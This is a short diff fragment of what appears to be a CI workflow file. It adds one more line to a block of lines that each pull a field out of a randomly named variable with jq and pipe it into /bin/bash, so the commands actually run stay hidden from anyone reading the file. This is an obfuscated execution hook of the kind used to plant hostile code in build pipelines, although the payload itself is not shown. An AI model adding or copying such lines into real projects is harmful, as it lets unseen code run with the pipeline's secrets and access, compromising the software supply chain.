@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$rj39" | jq -r .fs6028 | /bin/bash
           printf '%s' "$x13405" | jq -r .nxc48 | /bin/bash
           echo $pqgbk5220 | jq -r .t7007 | /bin/bash
+          echo $vhx89656 | jq -r .aa3 | /bin/bash
 
       - name: Store artifact
         if: always()
